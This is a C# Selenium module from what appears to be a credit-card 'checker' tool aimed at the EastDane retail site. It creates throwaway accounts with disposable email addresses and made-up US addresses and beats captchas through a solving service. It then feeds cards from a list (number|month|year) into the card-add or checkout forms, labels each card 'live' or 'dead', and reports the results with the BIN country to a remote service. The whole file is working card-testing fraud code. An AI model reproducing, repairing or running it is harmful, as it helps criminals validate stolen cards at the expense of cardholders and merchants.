using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Eatsdane
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(800);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                    {
                        driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                        Thread.Sleep(800);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

          
            if (Thunder._Form1.numcc() >0 && Variables.run == true)
            {
                try
                {



                    Thunder._Form1.update_progresbar(5);
                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");,  "--headless"
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors", "--headless");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;
                    //https://www.shopbop.com/jewelry-accessories/br/v=1/13539.htm
                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.eastdane.com/account/address";
                    Thread.Sleep(800);
                    correo = "joseffernana" + getNum() + "@hotmail.com";



                    if (tiempoElemento(By.XPath("//*[@id='createAccountSubmit']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='createAccountSubmit']")).Click();
                        Thread.Sleep(500);
                        if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
                        {
                            GetEmail();
                            Thunder._Form1.update_progresbar(20);
                            Thread.Sleep(500);

                            if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
                            {
                                driver.FindElement(By.XPath("//*[@id='ap_customer_name']")).SendKeys("JOSE");
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='ap_email']")).SendKeys(correo);
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(clave);
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='ap_password_check']")).SendKeys(clave);
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                                Thread.Sleep(500);
                                Thread.Sleep(1000);
                                var a = true;
                                var captche = "";
                                var imgCaptche = "";
                                if (IsElementPresent(By.XPath("//*[@id='cvf-page-content']/div/div/div/div[2]/div/img")))
                                {
                                    a = false;
                                    imgCaptche = driver.FindElement(By.XPath("//*[@id='cvf-page-content']/div/div/div/div[2]/div/img")).GetAttribute("src");
                                    Thread.Sleep(100);
                                }

                                ResolveCaptcha resolve = new ResolveCaptcha(Variables.key_captcha);
                                var intentos = 1;
                                while (a == false && intentos < 4)
                                {
                                    captche = resolve.Image(imgCaptche);
                                    if (captche is null)
                                    {
                                        a = false;
                                    }
                                    else
                                    {
                                        driver.FindElement(By.XPath("//*[@id='cvf-page-content']/div/div/div/form/div[2]/input")).SendKeys(captche);
                                        Thread.Sleep(500);
                                        driver.FindElement(By.Name("cvf_captcha_captcha_action")).Click();
                                        Thread.Sleep(800);
                                        if (IsElementPresent(By.XPath("//*[@id='cvf-page-content']/div/div/div/form/div[3]/div/div/div/div")))
                                        {
                                            a = false;
                                            captche = null;
                                        }
                                        else
                                        {
                                            Thunder._Form1.update_progresbar(30);
                                            a = true;
                                        }

                                    }
                                    Thread.Sleep(800);
                                    intentos++;
                                }

                                Thread.Sleep(800);

                                if (IsElementPresent(By.Name("cvf_captcha_captcha_action")))
                                {
                                    restart();
                                }

                                if (tiempoElemento(By.Id("cvf-input-code")))
                                {

                                    //GETCODIGO
                                    //Thread.Sleep(3000);
                                    driver.SwitchTo().Window(driver.WindowHandles[1]);
                                    Thread.Sleep(500);

                                    if (tiempoElemento(By.XPath("//*[@id='refresh']")))
                                    {
                                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                                        Thread.Sleep(2000);

                                        if (tiempoElementoeMAIL(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                                        {
                                            driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                                            Thread.Sleep(800);
                                            //opt
                                            if (tiempoElementoeMAILTR(By.XPath("//*[@id='message-frame']")))
                                            {
                                                driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='message-frame']")));
                                                Thread.Sleep(800);
                                                if (tiempoElemento(By.XPath("//*[@id='verificationMsg']/p[2]")))
                                                {
                                                    var opt = driver.FindElement(By.XPath("//*[@id='verificationMsg']/p[2]")).Text;
                                                    Thunder._Form1.update_progresbar(40);
                                                    Thread.Sleep(1000);

                                                    Thread.Sleep(500);
                                                    driver.SwitchTo().Window(driver.WindowHandles[0]);
                                                    Thread.Sleep(500);
                                                    driver.SwitchTo().ParentFrame();
                                                    Thread.Sleep(100);
                                                    if (tiempoElemento(By.Id("cvf-input-code")))
                                                    {
                                                        driver.FindElement(By.Id("cvf-input-code")).SendKeys(opt);
                                                        Thread.Sleep(100);
                                                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div/div/div/div/div/div[1]/form/div[6]/span/span/input")).Click();
                                                        Thread.Sleep(2500);

                                                        if (tiempoElemento(By.Id("select-birthday-month")))
                                                        {
                                                            Thread.Sleep(1000);
                                                            var mes = new SelectElement(driver.FindElement(By.Id("select-birthday-month")));
                                                            Thread.Sleep(500);
                                                            mes.SelectByIndex(2);
                                                            Thread.Sleep(800);
                                                            var dia = new SelectElement(driver.FindElement(By.Id("select-birthday-date")));
                                                            Thread.Sleep(500);
                                                            dia.SelectByText(RandomNumber(1, 25).ToString());
                                                            Thread.Sleep(500);
                                                            driver.FindElement(By.Id("post-reg-submit")).Click();
                                                            Thread.Sleep(800);

                                                            if (tiempoElemento(By.XPath("//*[@id='addressBookPage']/a")))
                                                            {
                                                                Thunder._Form1.update_progresbar(60);
                                                                driver.FindElement(By.XPath("//*[@id='addressBookPage']/a")).Click();
                                                                Thread.Sleep(800);
                                                                if (tiempoElemento(By.Id("addressCountryCode")))
                                                                {
                                                                    var country = new SelectElement(driver.FindElement(By.Id("addressCountryCode")));
                                                                    country.SelectByValue("US");
                                                                    Thread.Sleep(800);
                                                                    driver.FindElement(By.Id("lastName")).SendKeys("REYES");
                                                                    Thread.Sleep(200);
                                                                    driver.FindElement(By.Id("addressLine1")).SendKeys("STREET " + RandomNumber(20, 180));
                                                                    Thread.Sleep(200);
                                                                    driver.FindElement(By.Id("city")).SendKeys("MIAMI");
                                                                    Thread.Sleep(500);
                                                                    var estado = new SelectElement(driver.FindElement(By.Id("addressState")));
                                                                    Thread.Sleep(1000);
                                                                    estado.SelectByValue("FL");
                                                                    Thread.Sleep(500);
                                                                    driver.FindElement(By.Id("postalCode")).SendKeys("33206");
                                                                    Thread.Sleep(200);
                                                                    driver.FindElement(By.Id("phoneNumber")).SendKeys("213589" + RandomNumber(800, 9999));
                                                                    Thread.Sleep(200);
                                                                    driver.FindElement(By.XPath("//*[@id='addressFormButtonsDiv']/button")).Click();
                                                                    Thread.Sleep(500);

                                                                    if (tiempoElemento(By.XPath("//*[@id='addressBookPage']/div[2]/div/div/div[1]/a")))
                                                                    {
                                                                        Thunder._Form1.update_progresbar(70);
                                                                        driver.Navigate().GoToUrl("https://eastdane.com/accessories/br/v=1/19187.htm#/?f=department=19187%26sortBy.sort=PRICE%3AASC%26filterContext=19187%26tDim=220x390%26swDim=18x17%26baseIndex=0");
                                                                        Thread.Sleep(500);


                                                                        ///###
                                                                        if (IsElementPresent(By.XPath("//*[@id='esw-modal-close']")))
                                                                        {
                                                                            if (driver.FindElement(By.XPath("//*[@id='esw-modal-close']")).Displayed == true)
                                                                            {
                                                                                driver.FindElement(By.XPath("//*[@id='esw-modal-close']")).Click();
                                                                            }

                                                                        }

                                                                        Thread.Sleep(800);
                                                                        //if (tiempoElemento(By.Id("sortBySelect")))
                                                                        //{
                                                                        //    driver.FindElement(By.Id("sortBySelect")).Click();
                                                                        //    Thread.Sleep(800);
                                                                        //    driver.FindElement(By.Id("sortBy.price")).Click();
                                                                        //    Thread.Sleep(500);
                                                                                            

                                                                            var producto = "/html/body/div[12]/div[1]/div/div[3]/ul/li["+RandomNumber(1,40)+"]/div/a";
                                                                            if (tiempoElemento(By.XPath(producto)))
                                                                            {
                                                                                driver.FindElement(By.XPath(producto)).Click();
                                                                                Thread.Sleep(500);
                                                                                if (tiempoElemento(By.XPath("//*[@id='add-to-cart-btn']/span[1]")))
                                                                                {
                                                                                    if (IsElementPresent(By.XPath("//*[@id='sizeList']/div")))
                                                                                    {
                                                                                        driver.FindElement(By.XPath("//*[@id='sizeList']/div")).Click();
                                                                                        Thread.Sleep(500);
                                                                                    }

                                                                                    driver.FindElement(By.XPath("//*[@id='add-to-cart-btn']/span[1]")).Click();
                                                                                    Thread.Sleep(500);

                                                                                    if (tiempoElemento(By.XPath("//*[@id='checkout']")))
                                                                                    {
                                                                                        driver.FindElement(By.XPath("//*[@id='checkout']")).Click();
                                                                                        Thread.Sleep(500);
                                                                                        if (tiempoElemento(By.XPath("//*[@id='checkoutButtonPrimary']")))
                                                                                        {
                                                                                        Thunder._Form1.update_progresbar(80);

                                                                                        driver.FindElement(By.XPath("//*[@id='checkoutButtonPrimary']")).Click();
                                                                                            Thread.Sleep(500);

                                                                                           
                                                                                            Thread.Sleep(2000);

                                                                                                                          //*[@id="CheckoutContainer-KNVTK97"]/div/div[3]/div[1]/div[1]/div/div[1]/div[4]/div[1]/div/div/div[2]
                                                                                                                          

                                                                                      
                                                                                             if (IsElementPresent(By.Id("ccnumber")))
                                                                                            {
                                                                                                pago2();
                                                                                            }else if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[1]/div[4]/div[1]/div/div/div[2]")))
                                                                                        {
                                                                                           
                                                                                                driver.Navigate().GoToUrl("https://www.eastdane.com/account/creditcards?add");
                                                                                                Thread.Sleep(500);
                                                                                                if (tiempoElemento(By.Id("creditCardViewBean.walletCreditCardNumber")))
                                                                                                {
                                                                                                    pago();
                                                                                                }
                                                                                                else
                                                                                                {
                                                                                                    restart();
                                                                                                }
                                                                                                
                                                                                           
                                                                                        }
                                                                                            else
                                                                                            {
                                                                                                restart();
                                                                                            }


                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            restart();
                                                                                        }
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        restart();
                                                                                    }

                                                                                }
                                                                                else
                                                                                {
                                                                                    restart();
                                                                                }
                                                                            }
                                                                            else
                                                                            {
                                                                                restart();
                                                                            }
                                                                        //}
                                                                        //else
                                                                        //{
                                                                        //    restart();
                                                                        //}
                                                                        ///###

                                                                    }
                                                                    else
                                                                    {
                                                                        restart();
                                                                    }



                                                                }
                                                                else
                                                                {
                                                                    restart();
                                                                }
                                                            }
                                                            else
                                                            {
                                                                restart();
                                                            }

                                                        }

                                                    }
                                                    else
                                                    {
                                                        restart();
                                                    }
                                                }
                                                else
                                                {

                                                    restart();
                                                }
                                            }
                                            else
                                            {

                                                restart();
                                            }
                                        }
                                        else
                                        {

                                            restart();
                                        }

                                    }
                                    else
                                    {

                                        restart();
                                    }

                                }
                                else
                                {
                                    restart();
                                }


                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {

                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }
                }

            }
            else
            {
                stop();
            }
        }

        private void GetEmail()
        {


            //###--obtener email--#####
            ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
            driver.SwitchTo().Window(driver.WindowHandles.Last());
            Thread.Sleep(300);
            driver.Url = "https://www.abandonmail.com/es";
            Thread.Sleep(5000);

            if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
            {
                driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                Thread.Sleep(800);
            }
            else
            {

                restart();
            }

            if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
            {
                correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                Thread.Sleep(800);
            }
            else
            {

                restart();
            }

            Thread.Sleep(1000);

            driver.SwitchTo().Window(driver.WindowHandles.First());



        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(800);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                


                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Thunder._Form1.update_progresbar(90);
                        string cc = Thunder._Form1.nextCc();  
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (IsElementPresent(By.Id("creditCardViewBean.walletCreditCardNumber")))
                        {
                            driver.FindElement(By.Id("creditCardViewBean.walletCreditCardNumber")).SendKeys(ccnum);
                            Thread.Sleep(200);
                            var mescc = new SelectElement(driver.FindElement(By.Id("creditCardViewBean.expirationMonth")));
                            mescc.SelectByValue(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(200);
                            var aniocc = new SelectElement(driver.FindElement(By.Id("creditCardViewBean.expirationYear")));
                            aniocc.SelectByValue(Int16.Parse(ccLine[2]).ToString());
                            Thread.Sleep(200);
                            var tipocc = new SelectElement(driver.FindElement(By.Id("cardType")));
                            if (ccnum[0].ToString() == "4")
                            {
                                tipocc.SelectByValue("VISA");

                            }

                            if (ccnum[0].ToString() == "5")
                            {
                                tipocc.SelectByValue("MC");

                            }

                            if (ccnum[0].ToString() == "3")
                            {
                                tipocc.SelectByValue("AMEX");

                            }

                            if (ccnum[0].ToString() == "6")
                            {
                                tipocc.SelectByValue("DISC");

                            }
                            Thread.Sleep(100);
                            driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")).Click();
                            Thread.Sleep(100);

                            driver.FindElement(By.XPath("//*[@id='page']/div[2]/div/div[11]/button")).Click();
                            Thread.Sleep(200);

                            if (IsElementPresent(By.XPath("//*[@id='existingCreditCardsDiv']/div/div/div[2]/div[1]/a[1]")))
                            {
                                driver.Navigate().GoToUrl("https://www.eastdane.com/checkout");
                                Thread.Sleep(3000);


                                if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                                {
                                    driver.FindElementByXPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button").Click();
                                    Thread.Sleep(5000);
                                }

                                if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                                {
                                    driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Click();
                                    Thread.Sleep(5000);
                                }
                            }
                            else
                            {
                                restart();
                            }


                        }
                        else
                        {
                            restart();
                        }


                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop2();
                }
                //MessageBox.Show(ex.ToString());
                
            }

        }



       

        private void pago2()
        {
            try
            {
               


                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Thunder._Form1.update_progresbar(90);
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (IsElementPresent(By.Id("ccnumber")))
                        {
                            driver.FindElement(By.Id("ccnumber")).SendKeys(ccnum);
                            Thread.Sleep(200);
                            var mescc = new SelectElement(driver.FindElement(By.Name("creditCardViewBean.expirationMonth")));
                            mescc.SelectByValue(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(200);
                            var aniocc = new SelectElement(driver.FindElement(By.Name("creditCardViewBean.expirationYear")));
                            aniocc.SelectByValue(Int16.Parse(ccLine[2]).ToString());
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.Id("finalizeOrder")))
                            {
                                driver.FindElement(By.Id("finalizeOrder")).Click();
                                Thread.Sleep(2000);
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }


                        if (confirmar2())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago2();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }

            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }
        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }

        }

        public void stop2()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                return;
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                                                   
                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Displayed == true)
                        {

                            estado = "dead";

                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Displayed == true)
                        {

                            estado = "dead";

                        }
                    }

                                                   

                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
               // Thread.Sleep(1000);
                driver.Navigate().GoToUrl("https://www.eastdane.com/account/creditcards?add");
                Thread.Sleep(1000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public bool confirmar3()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Displayed == true)
                        {

                            estado = "dead";

                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(1000);
                driver.Navigate().GoToUrl("https://www.eastdane.com/account/creditcards?add");
                Thread.Sleep(1000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }

        public bool confirmar2()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("//*[@id='confirm']/div[2]/div[2]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='content']/div[1]/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='content']/div[1]/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='content']/div[1]/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='confirm']/div[2]/div[2]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }


                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(800);
                if (tiempoElemento(By.XPath("//*[@id='submitOrderForm']/div[1]/div/div[2]/div[1]/a")))
                {
                    Thread.Sleep(1000);
                    driver.FindElementByXPath("//*[@id='submitOrderForm']/div[1]/div/div[2]/div[1]/a").Click();
                    Thread.Sleep(1000);
                    if (tiempoElemento(By.Id("addCreditCardButton")))
                    {
                        Thread.Sleep(1000);
                        driver.FindElementById("addCreditCardButton").Click();
                        Thread.Sleep(800);
                        if (tiempoElemento(By.Id("ccnumber")))
                        {
                            return false;
                        }
                        else
                        {

                            restart();
                            return false;
                        }

                    }
                    else
                    {
                        restart();
                        return false;
                    }

                }
                else
                {
                    restart();
                    return false;
                }


            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }
        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

